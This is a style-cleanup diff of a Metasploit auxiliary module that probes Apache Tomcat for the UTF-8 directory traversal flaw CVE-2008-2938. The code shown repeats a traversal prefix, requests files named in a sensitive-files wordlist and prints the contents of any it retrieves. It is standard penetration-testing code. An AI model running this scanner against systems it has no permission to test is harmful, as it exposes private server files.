@@ -10,8 +10,8 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize
     super(
-      'Name'           => 'Tomcat UTF-8 Directory Traversal Vulnerability',
-      'Description'    => %q{
+      'Name' => 'Tomcat UTF-8 Directory Traversal Vulnerability',
+      'Description' => %q{
         This module tests whether a directory traversal vulnerability is present
         in versions of Apache Tomcat 4.1.0 - 4.1.37, 5.5.0 - 5.5.26 and 6.0.0
         - 6.0.16 under specific and non-default installations. The connector must have
@@ -22,15 +22,14 @@ class MetasploitModule < Msf::Auxiliary
         RedHat 9 running Tomcat 6.0.16 and Sun JRE 1.5.0-05. You may wish to change
         FILE (hosts,sensitive files), MAXDIRS and RPORT depending on your environment.
         },
-      'References'     =>
-        [
-          [ 'URL', 'http://tomcat.apache.org/' ],
-          [ 'OSVDB', '47464' ],
-          [ 'CVE', '2008-2938' ],
-          [ 'URL', 'http://www.securityfocus.com/archive/1/499926' ],
-        ],
-      'Author'         => [ 'aushack','guerrino <ruggine> di massa' ],
-      'License'        => MSF_LICENSE,
+      'References' => [
+        [ 'URL', 'http://tomcat.apache.org/' ],
+        [ 'OSVDB', '47464' ],
+        [ 'CVE', '2008-2938' ],
+        [ 'URL', 'http://www.securityfocus.com/archive/1/499926' ],
+      ],
+      'Author' => [ 'aushack', 'guerrino <ruggine> di massa' ],
+      'License' => MSF_LICENSE,
       'DisclosureDate' => 'Jan 9 2009'
     )
 
@@ -38,10 +37,13 @@ class MetasploitModule < Msf::Auxiliary
       [
         Opt::RPORT(8080),
         OptString.new('TARGETURI', [true, 'URI to the Tomcat instance', '/']),
-        OptPath.new('SENSITIVE_FILES',  [ true, "File containing senstive files, one per line",
-          File.join(Msf::Config.data_directory, "wordlists", "sensitive_files.txt") ]),
+        OptPath.new('SENSITIVE_FILES', [
+          true, 'File containing senstive files, one per line',
+          File.join(Msf::Config.data_directory, 'wordlists', 'sensitive_files.txt')
+        ]),
         OptInt.new('MAXDIRS', [ true, 'The maximum directory depth to search', 7]),
-      ])
+      ]
+    )
   end
 
   def extract_words(wordfile)
@@ -62,46 +64,47 @@ class MetasploitModule < Msf::Auxiliary
       try = traversal * level
       res = send_request_raw(
         {
-          'method'  => 'GET',
-          'uri'     => normalize_uri(datastore['TARGETURI'], try, files),
-          }, 25)
-      if (res and res.code == 200)
+          'method' => 'GET',
+          'uri' => normalize_uri(datastore['TARGETURI'], try, files)
+        }, 25
+      )
+      if (res && (res.code == 200))
         print_status("Request ##{level} may have succeeded on #{rhost}:#{rport}:file->#{files}! Response: \r\n#{res.body}")
         @files_found << files
         break
-      elsif (res and res.code)
+      elsif (res && res.code)
         vprint_error("Attempt ##{level} returned HTTP error #{res.code} on #{rhost}:#{rport}:file->#{files}")
       end
     end
   end
 
-  def run_host(ip)
+  def run_host(_ip)
     @files_found = []
 
     begin
       print_status("Attempting to connect to #{rhost}:#{rport}")
       res = send_request_raw(
         {
-          'method'  => 'GET',
-          'uri'     => normalize_uri(datastore['TARGETURI']),
-        }, 25)
+          'method' => 'GET',
+          'uri' => normalize_uri(datastore['TARGETURI'])
+        }, 25
+      )
 
-      if (res)
+      if res
         extract_words(datastore['SENSITIVE_FILES']).each do |files|
           find_files(files) unless files.empty?
         end
       end
 
-      if not @files_found.empty?
-        print_good("File(s) found:")
+      if !@files_found.empty?
+        print_good('File(s) found:')
 
         @files_found.each do |f|
           print_good(f)
         end
       else
-        print_good("No File(s) found")
+        print_error('No File(s) found')
       end
-
     rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
     rescue ::Timeout::Error, ::Errno::EPIPE
     end
